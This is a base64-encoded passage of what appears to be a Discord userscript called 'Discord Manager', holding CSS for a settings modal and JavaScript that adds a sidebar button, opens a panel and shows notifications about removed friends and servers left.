dDsKICAgICAgICAgICAgcGFkZGluZzogMCAhaW1wb3J0YW50OwogICAgICAgIH0KCiAgICAgICAgLmRmbS1zZXR0aW5ncy1tb2RhbCB7CiAgICAgICAgICAgIHBvc2l0aW9uOiBmaXhlZCAhaW1wb3J0YW50OwogICAgICAgICAgICB0b3A6IDAgIWltcG9ydGFudDsKICAgICAgICAgICAgbGVmdDogMCAhaW1wb3J0YW50OwogICAgICAgICAgICB3aWR0aDogMTAwJSAhaW1wb3J0YW50OwogICAgICAgICAgICBoZWlnaHQ6IDEwMCUgIWltcG9ydGFudDsKICAgICAgICAgICAgYmFja2dyb3VuZDogcmdiYSgwLCAwLCAwLCAwLjgpICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIGRpc3BsYXk6IGZsZXggIWltcG9ydGFudDsKICAgICAgICAgICAgYWxpZ24taXRlbXM6IGNlbnRlciAhaW1wb3J0YW50OwogICAgICAgICAgICBqdXN0aWZ5LWNvbnRlbnQ6IGNlbnRlciAhaW1wb3J0YW50OwogICAgICAgICAgICB6LWluZGV4OiAxMDAwMDAxICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIHBhZGRpbmc6IDIwcHggIWltcG9ydGFudDsKICAgICAgICAgICAgYmFja2Ryb3AtZmlsdGVyOiBibHVyKDRweCkgIWltcG9ydGFudDsKICAgICAgICB9CgogICAgICAgIC5kZm0tc2V0dGluZ3MtY29udGVudCB7CiAgICAgICAgICAgIGJhY2tncm91bmQ6IGxpbmVhci1ncmFkaWVudCgxNDVkZWcsICMxYTFhMWEgMCUsICMxNDE0MTQgMTAwJSkgIWltcG9ydGFudDsKICAgICAgICAgICAgcGFkZGluZzogMjRweCAhaW1wb3J0YW50OwogICAgICAgICAgICBib3JkZXItcmFkaXVzOiAxMnB4ICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIG1heC13aWR0aDogMzgwcHggIWltcG9ydGFudDsKICAgICAgICAgICAgd2lkdGg6IDEwMCUgIWltcG9ydGFudDsKICAgICAgICAgICAgYW5pbWF0aW9uOiBtb2RhbEZhZGVJbiAwLjJzIGVhc2UgIWltcG9ydGFudDsKICAgICAgICAgICAgYm94LXNoYWRvdzogMCA4cHggMzJweCByZ2JhKDAsIDAsIDAsIDAuNSkgIWltcG9ydGFudDsKICAgICAgICAgICAgYm9yZGVyOiAxcHggc29saWQgcmdiYSgyNTUsIDI1NSwgMjU1LCAwLjEpICFpbXBvcnRhbnQ7CiAgICAgICAgfQoKICAgICAgICAuZGZtLXNldHRpbmdzLXRpdGxlIHsKICAgICAgICAgICAgY29sb3I6ICNmZmZmZmYgIWltcG9ydGFudDsKICAgICAgICAgICAgZm9udC1zaXplOiAxOHB4ICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIGZvbnQtd2VpZ2h0OiA3MDAgIWltcG9ydGFudDsKICAgICAgICAgICAgbWFyZ2luOiAwIDAgMjBweCAwICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIHBhZGRpbmc6IDAgIWltcG9ydGFudDsKICAgICAgICAgICAgdGV4dC1hbGlnbjogY2VudGVyICFpbXBvcnRhbnQ7CiAgICAgICAgfQoKICAgICAgICAuZGZtLXNldHRpbmdzLW9wdGlvbiB7CiAgICAgICAgICAgIG1hcmdpbjogMCAwIDIwcHggMCAhaW1wb3J0YW50OwogICAgICAgIH0KCiAgICAgICAgLmRmbS1zZXR0aW5ncy1sYWJlbCB7CiAgICAgICAgICAgIGNvbG9yOiAjYjBiMGIwICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIGZvbnQtc2l6ZTogMTRweCAhaW1wb3J0YW50OwogICAgICAgICAgICBtYXJnaW46IDAgMCA4cHggMCAhaW1wb3J0YW50OwogICAgICAgICAgICBwYWRkaW5nOiAwICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIGRpc3BsYXk6IGJsb2NrICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIGZvbnQtd2VpZ2h0OiA1MDAgIWltcG9ydGFudDsKICAgICAgICB9CgogICAgICAgIC5kZm0tc2V0dGluZ3Mtc2VsZWN0IHsKICAgICAgICAgICAgd2lkdGg6IDEwMCUgIWltcG9ydGFudDsKICAgICAgICAgICAgcGFkZGluZzogMTJweCA0MHB4IDEycHggMTRweCAhaW1wb3J0YW50OwogICAgICAgICAgICBiYWNrZ3JvdW5kOiByZ2JhKDI1NSwgMjU1LCAyNTUsIDAuMDYpICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIGJvcmRlcjogMXB4IHNvbGlkIHJnYmEoMjU1LCAyNTUsIDI1NSwgMC4xKSAhaW1wb3J0YW50OwogICAgICAgICAgICBib3JkZXItcmFkaXVzOiA4cHggIWltcG9ydGFudDsKICAgICAgICAgICAgY29sb3I6ICNmZmZmZmYgIWltcG9ydGFudDsKICAgICAgICAgICAgZm9udC1zaXplOiAxNHB4ICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIGN1cnNvcjogcG9pbnRlciAhaW1wb3J0YW50OwogICAgICAgICAgICBhcHBlYXJhbmNlOiBub25lICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIGJhY2tncm91bmQtaW1hZ2U6IHVybCgiZGF0YTppbWFnZS9zdmcreG1sO2NoYXJzZXQ9VVRGLTgsJTNjc3ZnIHhtbG5zPSdodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2Zycgdmlld0JveD0nMCAwIDI0IDI0JyBmaWxsPSclMjM4ODgnJTNlJTNjcGF0aCBkPSdNNyAxMGw1IDUgNS01eicvJTNlJTNjL3N2ZyUzZSIpICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIGJhY2tncm91bmQtcmVwZWF0OiBuby1yZXBlYXQgIWltcG9ydGFudDsKICAgICAgICAgICAgYmFja2dyb3VuZC1wb3NpdGlvbjogcmlnaHQgMTJweCBjZW50ZXIgIWltcG9ydGFudDsKICAgICAgICAgICAgYmFja2dyb3VuZC1zaXplOiAyMHB4ICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIHRyYW5zaXRpb246IGFsbCAwLjE1cyBlYXNlICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIG91dGxpbmU6IG5vbmUgIWltcG9ydGFudDsKICAgICAgICAgICAgbWFyZ2luOiAwICFpbXBvcnRhbnQ7CiAgICAgICAgfQoKICAgICAgICAuZGZtLXNldHRpbmdzLXNlbGVjdDpmb2N1cyB7CiAgICAgICAgICAgIGJvcmRlci1jb2xvcjogIzU4NjVmMiAhaW1wb3J0YW50OwogICAgICAgICAgICBiYWNrZ3JvdW5kLWNvbG9yOiByZ2JhKDg4LCAxMDEsIDI0MiwgMC4xKSAhaW1wb3J0YW50OwogICAgICAgIH0KCiAgICAgICAgLmRmbS1zZXR0aW5ncy1zZWxlY3Qgb3B0aW9uIHsKICAgICAgICAgICAgYmFja2dyb3VuZDogIzFhMWExYSAhaW1wb3J0YW50OwogICAgICAgICAgICBjb2xvcjogI2ZmZmZmZiAhaW1wb3J0YW50OwogICAgICAgICAgICBwYWRkaW5nOiAxMHB4ICFpbXBvcnRhbnQ7CiAgICAgICAgfQoKICAgICAgICAuZGZtLWFkdmFuY2VkLXNlY3Rpb24gewogICAgICAgICAgICBiYWNrZ3JvdW5kOiByZ2JhKDI1NSwgMjU1LCAyNTUsIDAuMDMpICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIGJvcmRlcjogMXB4IHNvbGlkIHJnYmEoMjU1LCAyNTUsIDI1NSwgMC4wOCkgIWltcG9ydGFudDsKICAgICAgICAgICAgYm9yZGVyLXJhZGl1czogMTBweCAhaW1wb3J0YW50OwogICAgICAgICAgICBwYWRkaW5nOiAyMHB4ICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIG1hcmdpbi1ib3R0b206IDE2cHggIWltcG9ydGFudDsKICAgICAgICB9CgogICAgICAgIC5kZm0tc2VjdGlvbi1oZWFkZXIgewogICAgICAgICAgICBkaXNwbGF5OiBmbGV4ICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIGFsaWduLWl0ZW1zOiBjZW50ZXIgIWltcG9ydGFudDsKICAgICAgICAgICAgZ2FwOiAxMHB4ICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIG1hcmdpbi1ib3R0b206IDhweCAhaW1wb3J0YW50OwogICAgICAgIH0KCiAgICAgICAgLmRmbS1zZWN0aW9uLXRpdGxlIHsKICAgICAgICAgICAgY29sb3I6ICNmZmZmZmYgIWltcG9ydGFudDsKICAgICAgICAgICAgZm9udC1zaXplOiAxNnB4ICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIGZvbnQtd2VpZ2h0OiA2MDAgIWltcG9ydGFudDsKICAgICAgICAgICAgbWFyZ2luOiAwIDAgOHB4IDAgIWltcG9ydGFudDsKICAgICAgICB9CgogICAgICAgIC5kZm0tc2VjdGlvbi1oZWFkZXIgLmRmbS1zZWN0aW9uLXRpdGxlIHsKICAgICAgICAgICAgbWFyZ2luOiAwICFpbXBvcnRhbnQ7CiAgICAgICAgfQoKICAgICAgICAuZGZtLXNlY3Rpb24tZGVzY3JpcHRpb24gewogICAgICAgICAgICBjb2xvcjogIzg4ODg4OCAhaW1wb3J0YW50OwogICAgICAgICAgICBmb250LXNpemU6IDEzcHggIWltcG9ydGFudDsKICAgICAgICAgICAgbGluZS1oZWlnaHQ6IDEuNSAhaW1wb3J0YW50OwogICAgICAgICAgICBtYXJnaW46IDAgMCAxNnB4IDAgIWltcG9ydGFudDsKICAgICAgICB9CgogICAgICAgIC5kZm0taW5wdXQtZ3JvdXAgewogICAgICAgICAgICBkaXNwbGF5OiBmbGV4ICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIGdhcDogMTBweCAhaW1wb3J0YW50OwogICAgICAgIH0KCiAgICAgICAgLmRmbS1pbnB1dCB7CiAgICAgICAgICAgIGZsZXg6IDEgIWltcG9ydGFudDsKICAgICAgICAgICAgcGFkZGluZzogMTJweCAxNnB4ICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIGJhY2tncm91bmQ6IHJnYmEoMjU1LCAyNTUsIDI1NSwgMC4wNikgIWltcG9ydGFudDsKICAgICAgICAgICAgYm9yZGVyOiAxcHggc29saWQgcmdiYSgyNTUsIDI1NSwgMjU1LCAwLjEpICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIGJvcmRlci1yYWRpdXM6IDhweCAhaW1wb3J0YW50OwogICAgICAgICAgICBjb2xvcjogI2ZmZmZmZiAhaW1wb3J0YW50OwogICAgICAgICAgICBmb250LXNpemU6IDE0cHggIWltcG9ydGFudDsKICAgICAgICAgICAgdHJhbnNpdGlvbjogYWxsIDAuMnMgZWFzZSAhaW1wb3J0YW50OwogICAgICAgICAgICBvdXRsaW5lOiBub25lICFpbXBvcnRhbnQ7CiAgICAgICAgfQoKICAgICAgICAuZGZtLWlucHV0OjpwbGFjZWhvbGRlciB7CiAgICAgICAgICAgIGNvbG9yOiAjNjY2NjY2ICFpbXBvcnRhbnQ7CiAgICAgICAgfQoKICAgICAgICAuZGZtLWlucHV0OmZvY3VzIHsKICAgICAgICAgICAgYm9yZGVyLWNvbG9yOiAjNTg2NWYyICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIGJhY2tncm91bmQ6IHJnYmEoODgsIDEwMSwgMjQyLCAwLjEpICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIGJveC1zaGFkb3c6IDAgMCAwIDJweCByZ2JhKDg4LCAxMDEsIDI0MiwgMC4yKSAhaW1wb3J0YW50OwogICAgICAgIH0KCiAgICAgICAgLmRmbS1iZXRhLXNlY3Rpb24gewogICAgICAgICAgICBib3JkZXItY29sb3I6IHJnYmEoMjUwLCAxNjYsIDI2LCAwLjMpICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIGJhY2tncm91bmQ6IHJnYmEoMjUwLCAxNjYsIDI2LCAwLjA1KSAhaW1wb3J0YW50OwogICAgICAgIH0KCiAgICAgICAgLmRmbS1iZXRhLWJhZGdlIHsKICAgICAgICAgICAgYmFja2dyb3VuZDogbGluZWFyLWdyYWRpZW50KDEzNWRlZywgI2ZhYTYxYSAwJSwgI2Q2OGExNSAxMDAlKSAhaW1wb3J0YW50OwogICAgICAgICAgICBjb2xvcjogIzAwMDAwMCAhaW1wb3J0YW50OwogICAgICAgICAgICBmb250LXNpemU6IDEwcHggIWltcG9ydGFudDsKICAgICAgICAgICAgZm9udC13ZWlnaHQ6IDcwMCAhaW1wb3J0YW50OwogICAgICAgICAgICBwYWRkaW5nOiAzcHggOHB4ICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIGJvcmRlci1yYWRpdXM6IDRweCAhaW1wb3J0YW50OwogICAgICAgICAgICB0ZXh0LXRyYW5zZm9ybTogdXBwZXJjYXNlICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIGxldHRlci1zcGFjaW5nOiAwLjVweCAhaW1wb3J0YW50OwogICAgICAgIH0KCiAgICAgICAgLmRmbS1wcm9ncmVzcy1hY3Rpb25zIHsKICAgICAgICAgICAgZGlzcGxheTogZmxleCAhaW1wb3J0YW50OwogICAgICAgICAgICBqdXN0aWZ5LWNvbnRlbnQ6IGNlbnRlciAhaW1wb3J0YW50OwogICAgICAgICAgICBtYXJnaW4tdG9wOiAxNnB4ICFpbXBvcnRhbnQ7CiAgICAgICAgfQoKICAgICAgICAuZGZtLWJ0bi1jYW5jZWwgewogICAgICAgICAgICBiYWNrZ3JvdW5kOiBsaW5lYXItZ3JhZGllbnQoMTM1ZGVnLCAjNzI3NjdkIDAlLCAjNWQ2MTY5IDEwMCUpICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIGNvbG9yOiAjZmZmZmZmICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIGJvcmRlcjogbm9uZSAhaW1wb3J0YW50OwogICAgICAgICAgICBwYWRkaW5nOiAxMHB4IDI0cHggIWltcG9ydGFudDsKICAgICAgICAgICAgYm9yZGVyLXJhZGl1czogOHB4ICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIGZvbnQtc2l6ZTogMTRweCAhaW1wb3J0YW50OwogICAgICAgICAgICBmb250LXdlaWdodDogNjAwICFpbXBvcnRhbnQ7CiAgICAgICAgICAgIGN1cnNvcjogcG9pbnRlciAhaW1wb3J0YW50OwogICAgICAgICAgICB0cmFuc2l0aW9uOiBhbGwgMC4xNXMgZWFzZSAhaW1wb3J0YW50OwogICAgICAgIH0KCiAgICAgICAgLmRmbS1idG4tY2FuY2VsOmhvdmVyIHsKICAgICAgICAgICAgZmlsdGVyOiBicmlnaHRuZXNzKDEuMSkgIWltcG9ydGFudDsKICAgICAgICAgICAgdHJhbnNmb3JtOiB0cmFuc2xhdGVZKC0xcHgpICFpbXBvcnRhbnQ7CiAgICAgICAgfQoKICAgICAgICAuZGZtLWJ0bi1jYW5jZWw6ZGlzYWJsZWQgewogICAgICAgICAgICBvcGFjaXR5OiAwLjUgIWltcG9ydGFudDsKICAgICAgICAgICAgY3Vyc29yOiBub3QtYWxsb3dlZCAhaW1wb3J0YW50OwogICAgICAgIH0KICAgIGA7CiAgICBkb2N1bWVudC5oZWFkLmFwcGVuZENoaWxkKHN0eWxlKTsKCiAgICBjb25zdCBub3RpZmljYXRpb25Db250YWluZXIgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdkaXYnKTsKICAgIG5vdGlmaWNhdGlvbkNvbnRhaW5lci5pZCA9ICdkZm0tbm90aWZpY2F0aW9uLWNvbnRhaW5lcic7CiAgICBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKG5vdGlmaWNhdGlvbkNvbnRhaW5lcik7CgogICAgbGV0IGlzTWFuYWdlck9wZW4gPSBmYWxzZTsKICAgIGxldCBpc0FuaW1hdGluZyA9IGZhbHNlOwoKICAgIGNvbnN0IGNyZWF0ZURpc2NvcmRNYW5hZ2VyQnV0dG9uID0gKCkgPT4gewogICAgICAgIGNvbnN0IGV4aXN0aW5nQnV0dG9uID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2Rpc2NvcmQtbWFuYWdlci1uYXYtYnV0dG9uJyk7CiAgICAgICAgaWYgKGV4aXN0aW5nQnV0dG9uKSByZXR1cm4gdHJ1ZTsKCiAgICAgICAgY29uc3QgcXVlc3RzQ29udGFpbmVyID0gZG9jdW1lbnQucXVlcnlTZWxlY3RvcignW2RhdGEtbGlzdC1pdGVtLWlkKj0icXVlc3RzIl0nKTsKICAgICAgICBpZiAoIXF1ZXN0c0NvbnRhaW5lcikgcmV0dXJuIGZhbHNlOwoKICAgICAgICBjb25zdCBxdWVzdHNMaXN0SXRlbSA9IHF1ZXN0c0NvbnRhaW5lci5jbG9zZXN0KCdsaScpOwogICAgICAgIGlmICghcXVlc3RzTGlzdEl0ZW0/LnBhcmVudE5vZGUpIHJldHVybiBmYWxzZTsKCiAgICAgICAgY29uc3QgbWFuYWdlckJ1dHRvbiA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ2xpJyk7CiAgICAgICAgbWFuYWdlckJ1dHRvbi5pZCA9ICdkaXNjb3JkLW1hbmFnZXItbmF2LWJ1dHRvbic7CiAgICAgICAgbWFuYWdlckJ1dHRvbi5jbGFzc05hbWUgPSAnXzk3MmEwZDIyYzhhZmE3ZjAtY2hhbm5lbCBlNDU4NTlkNjA3OTlhZDdjLWNvbnRhaW5lcic7CiAgICAgICAgbWFuYWdlckJ1dHRvbi5zZXRBdHRyaWJ1dGUoJ3JvbGUnLCAnbGlzdGl0ZW0nKTsKICAgICAgICBtYW5hZ2VyQnV0dG9uLmlubmVySFRNTCA9IGAKICAgICAgICAgICAgPGRpdiBjbGFzcz0iYmYyMDJkNjNhZDUzZTI4OS1pbnRlcmFjdGl2ZSBfOTcyYTBkMjJjOGFmYTdmMC1pbnRlcmFjdGl2ZSBfOTcyYTBkMjJjOGFmYTdmMC1saW5rQnV0dG9uIj4KICAgICAgICAgICAgICAgIDxhIGNsYXNzPSJfOTcyYTBkMjJjOGFmYTdmMC1saW5rIiBkYXRhLWxpc3QtaXRlbS1pZD0icHJpdmF0ZS1jaGFubmVscy11aWRfMzBfX19kaXNjb3JkX21hbmFnZXIiIHRhYmluZGV4PSItMSIgaHJlZj0iIyI+CiAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iXzIwYTUzODQ2ZmUyZTg1MTMtbGF5b3V0IF85NzJhMGQyMmM4YWZhN2YwLWF2YXRhcldpdGhUZXh0Ij4KICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iXzIwYTUzODQ2ZmUyZTg1MTMtYXZhdGFyIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxzdmcgY2xhc3M9Il85NzJhMGQyMmM4YWZhN2YwLWxpbmtCdXR0b25JY29uIiBhcmlhLWhpZGRlbj0idHJ1ZSIgcm9sZT0iaW1nIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyMCIgaGVpZ2h0PSIyMCIgZmlsbD0ibm9uZSIgdmlld0JveD0iMCAwIDI0IDI0Ij4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8cGF0aCBmaWxsPSJjdXJyZW50Q29sb3IiIGQ9Ik0xMiAyQzYuNDggMiAyIDYuNDggMiAxMnM0LjQ4IDEwIDEwIDEwIDEwLTQuNDggMTAtMTBTMTcuNTIgMiAxMiAyem0tMSAxNy45M2MtMy45NS0uNDktNy0zLjg1LTctNy45MyAwLS42Mi4wOC0xLjIxLjIxLTEuNzlMOSAxNXYxYzAgMS4xLjkgMiAyIDJ2MS45M3ptNi45LTIuNTRjLS4yNi0uODEtMS0xLjM5LTEuOS0xLjM5aC0xdi0zYzAtLjU1LS40NS0xLTEtMUg4di0yaDJjLjU1IDAgMS0uNDUgMS0xVjdoMmMxLjEgMCAyLS45IDItMnYtLjQxYzIuOTMgMS4xOSA1IDQuMDYgNSA3LjQxIDAgMi4wOC0uOCAzLjk3LTIuMSA1LjM5eiIvPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9zdmc+CiAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJfMjBhNTM4NDZmZTJlODUxMy1jb250ZW50Ij4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9Il8yMGE1Mzg0NmZlMmU4NTEzLW5hbWVBbmREZWNvcmF0b3JzIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJfMjBhNTM4NDZmZTJlODUxMy1sZWZ0TmFtZSI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9Il8yMGE1Mzg0NmZlMmU4NTEzLW5hbWUiPkRpc2NvcmQgTWFuYWdlcjwvZGl2PgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgPC9hPgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICBgOwoKICAgICAgICBxdWVzdHNMaXN0SXRlbS5wYXJlbnROb2RlLmluc2VydEJlZm9yZShtYW5hZ2VyQnV0dG9uLCBxdWVzdHNMaXN0SXRlbS5uZXh0U2libGluZyk7CgogICAgICAgIG1hbmFnZXJCdXR0b24ucXVlcnlTZWxlY3RvcignYScpLmFkZEV2ZW50TGlzdGVuZXIoJ2NsaWNrJywgKGUpID0+IHsKICAgICAgICAgICAgZS5wcmV2ZW50RGVmYXVsdCgpOwogICAgICAgICAgICBlLnN0b3BQcm9wYWdhdGlvbigpOwogICAgICAgICAgICBvcGVuTWFuYWdlcigpOwogICAgICAgIH0pOwoKICAgICAgICByZXR1cm4gdHJ1ZTsKICAgIH07CgogICAgY29uc3Qgb3Blbk1hbmFnZXIgPSAoKSA9PiB7CiAgICAgICAgaWYgKGlzQW5pbWF0aW5nIHx8IGlzTWFuYWdlck9wZW4pIHJldHVybjsKICAgICAgICBpc0FuaW1hdGluZyA9IHRydWU7CiAgICAgICAgaXNNYW5hZ2VyT3BlbiA9IHRydWU7CgogICAgICAgIGNvbnN0IGNvbnRhaW5lcldpZHRoID0gTWF0aC5taW4oNzAwLCB3aW5kb3cuaW5uZXJXaWR0aCAtIDQwKTsKICAgICAgICBjb25zdCBjb250YWluZXJIZWlnaHQgPSBNYXRoLm1pbig2MDAsIHdpbmRvdy5pbm5lckhlaWdodCAtIDQwKTsKICAgICAgICBjb250YWluZXIuc3R5bGUubGVmdCA9IGAkeyh3aW5kb3cuaW5uZXJXaWR0aCAtIGNvbnRhaW5lcldpZHRoKSAvIDJ9cHhgOwogICAgICAgIGNvbnRhaW5lci5zdHlsZS50b3AgPSBgJHsod2luZG93LmlubmVySGVpZ2h0IC0gY29udGFpbmVySGVpZ2h0KSAvIDJ9cHhgOwogICAgICAgIGNvbnRhaW5lci5zdHlsZS50cmFuc2Zvcm0gPSAnbm9uZSc7CgogICAgICAgIGNvbnRhaW5lci5jbGFzc0xpc3QucmVtb3ZlKCdjbG9zaW5nJyk7CiAgICAgICAgY29udGFpbmVyLmNsYXNzTGlzdC5hZGQoJ3Zpc2libGUnKTsKCiAgICAgICAgc2V0VGltZW91dCgoKSA9PiB7IGlzQW5pbWF0aW5nID0gZmFsc2U7IH0sIDI1MCk7CiAgICB9OwoKICAgIGNvbnN0IGNsb3NlTWFuYWdlciA9ICgpID0+IHsKICAgICAgICBpZiAoaXNBbmltYXRpbmcgfHwgIWlzTWFuYWdlck9wZW4pIHJldHVybjsKICAgICAgICBpc0FuaW1hdGluZyA9IHRydWU7CgogICAgICAgIGNvbnRhaW5lci5jbGFzc0xpc3QucmVtb3ZlKCd2aXNpYmxlJyk7CiAgICAgICAgY29udGFpbmVyLmNsYXNzTGlzdC5hZGQoJ2Nsb3NpbmcnKTsKCiAgICAgICAgc2V0VGltZW91dCgoKSA9PiB7CiAgICAgICAgICAgIGNvbnRhaW5lci5jbGFzc0xpc3QucmVtb3ZlKCdjbG9zaW5nJyk7CiAgICAgICAgICAgIGlzTWFuYWdlck9wZW4gPSBmYWxzZTsKICAgICAgICAgICAgaXNBbmltYXRpbmcgPSBmYWxzZTsKICAgICAgICB9LCAyNTApOwogICAgfTsKCiAgICBjb25zdCBjaGVja0FuZENyZWF0ZUJ1dHRvbiA9ICgpID0+IHsKICAgICAgICBjb25zdCBidXR0b25FeGlzdHMgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZGlzY29yZC1tYW5hZ2VyLW5hdi1idXR0b24nKTsKICAgICAgICBpZiAoIWJ1dHRvbkV4aXN0cykgewogICAgICAgICAgICBjcmVhdGVEaXNjb3JkTWFuYWdlckJ1dHRvbigpOwogICAgICAgIH0KICAgIH07CgogICAgc2V0SW50ZXJ2YWwoY2hlY2tBbmRDcmVhdGVCdXR0b24sIDIwMDApOwoKICAgIGNvbnN0IHNob3dOb3RpZmljYXRpb24gPSAobWVzc2FnZSwgdHlwZSA9ICdpbmZvJywgdGl0bGUgPSAnJywgaWNvblVybCA9ICcnLCBuYW1lID0gJycpID0+IHsKICAgICAgICBjb25zdCBub3RpZmljYXRpb24gPSB7IG1lc3NhZ2UsIHR5cGUsIHRpdGxlLCBpY29uVXJsLCBuYW1lLCBpZDogRGF0ZS5ub3coKSArIE1hdGgucmFuZG9tKCkgfTsKCiAgICAgICAgaWYgKGFjdGl2ZU5vdGlmaWNhdGlvbnMgPj0gMykgewogICAgICAgICAgICBub3RpZmljYXRpb25RdWV1ZS5wdXNoKG5vdGlmaWNhdGlvbik7CiAgICAgICAgICAgIHJldHVybjsKICAgICAgICB9CgogICAgICAgIGRpc3BsYXlOb3RpZmljYXRpb24obm90aWZpY2F0aW9uKTsKICAgIH07CgogICAgY29uc3QgZGlzcGxheU5vdGlmaWNhdGlvbiA9IChub3RpZmljYXRpb24pID0+IHsKICAgICAgICBhY3RpdmVOb3RpZmljYXRpb25zKys7CiAgICAgICAgY29uc3QgaWNvbnMgPSB7IHN1Y2Nlc3M6ICfinJMnLCBlcnJvcjogJ+KclScsIHdhcm5pbmc6ICfimqAnLCBpbmZvOiAn4oS5JyB9OwoKICAgICAgICBjb25zdCBub3RpZkVsZW1lbnQgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdkaXYnKTsKICAgICAgICBub3RpZkVsZW1lbnQuY2xhc3NOYW1lID0gYGRmbS1ub3RpZmljYXRpb24gJHtub3RpZmljYXRpb24udHlwZX1gOwogICAgICAgIG5vdGlmRWxlbWVudC5kYXRhc2V0LmlkID0gbm90aWZpY2F0aW9uLmlkOwoKICAgICAgICBpZiAoKG5vdGlmaWNhdGlvbi50eXBlID09PSAnZnJpZW5kLXJlbW92ZWQnIHx8IG5vdGlmaWNhdGlvbi50eXBlID09PSAnc2VydmVyLWxlZnQnKSAmJiBub3RpZmljYXRpb24uaWNvblVybCAmJiBub3RpZmljYXRpb24ubmFtZSkgewogICAgICAgICAgICBjb25zdCBpc1NlcnZlckxlZnQgPSBub3RpZmljYXRpb24udHlwZSA9PT0gJ3NlcnZlci1sZWZ0JzsKICAgICAgICAgICAgbm90aWZFbGVtZW50LmNsYXNzTGlzdC5hZGQoaXNTZXJ2ZXJMZWZ0ID8gJ3NlcnZlci1sZWZ0JyA6ICdmcmllbmQtcmVtb3ZlZCcpOwogICAgICAgICAgICBub3RpZkVsZW1lbnQuaW5uZXJIVE1MID0gYAogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iJHtpc1NlcnZlckxlZnQgPyAnZGZtLXNlcnZlci1sZWZ0LWNvbnRlbnQnIDogJ2RmbS1mcmllbmQtcmVtb3ZlZC1jb250ZW50J30iPgogICAgICAgICAgICAgICAgICAgIDxpbWcgY2xhc3M9IiR7aXNTZXJ2ZXJMZWZ0ID8gJ2RmbS1zZXJ2ZXItbGVmdC1pY29uJyA6ICdkZm0tZnJpZW5kLXJlbW92ZWQtYXZhdGFyJ30iIHNyYz0iJHtub3RpZmljYXRpb24uaWNvblVybH0iIG9uZXJyb3I9InRoaXMuc3JjPSdodHRwczovL2Nkbi5kaXNjb3JkYXBwLmNvbS9lbWJlZC9hdmF0YXJzLzAucG5nJyI+CiAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iJHtpc1NlcnZlckxlZnQgPyAnZGZtLXNlcnZlci1sZWZ0LWluZm8nIDogJ2RmbS1mcmllbmQtcmVtb3ZlZC1pbmZvJ30iPgogICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSIke2lzU2VydmVyTGVmdCA/ICdkZm0tc2VydmVyLWxlZnQtbmFtZScgOiAnZGZtLWZyaWVuZC1yZW1vdmVkLW5hbWUnfSI+JHtub3RpZmljYXRpb24ubmFtZX08L2Rpdj4KICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iJHtpc1NlcnZlckxlZnQgPyAnZGZtLXNlcnZlci1sZWZ0LXRleHQnIDogJ2RmbS1mcmllbmQtcmVtb3ZlZC10ZXh0J30iPiR7aXNTZXJ2ZXJMZWZ0ID8gJ1NlcnZpZG9yIGFiYW5kb25hZG8nIDogJ0FtaWdvIHJlbW92aWRvJ308L2Rpdj4KICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICA8YnV0dG9uIGNsYXNzPSJkZm0tbm90aWZpY2F0aW9uLWNsb3NlIj7DlzwvYnV0dG9uPgogICAgICAgICAgICAgICAgPC9kaXY+CiAgIC